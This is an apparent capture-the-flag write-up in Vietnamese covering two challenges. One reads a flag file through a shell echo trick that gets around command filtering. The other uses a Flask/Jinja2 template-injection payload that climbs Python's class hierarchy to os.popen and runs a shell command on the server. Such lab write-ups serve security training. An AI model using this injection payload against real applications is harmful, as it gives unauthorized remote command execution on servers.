# Misc 
  ## 1.Dodge
   Dùng echo để xem nội dung của file flag.txt : **echo$(<flag.txt)**
   
   <img src="https://i.imgur.com/Uklgpej.png" />
   
# Web
  ## 2.Nothingness
  
  Do web được viết từ Flask nên có thể inject được payload sau để xe flag được giấu trong flag_HKOOS2lrdD.txt
  
  Payload :
  
  ```python
  {{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat ../flag_HKOOS2lrdD flag_HKOOS2lrdD").read()}}
  ```
  
  Flag của bài :
  
  <img src="https://i.imgur.com/wqdA38j.png" />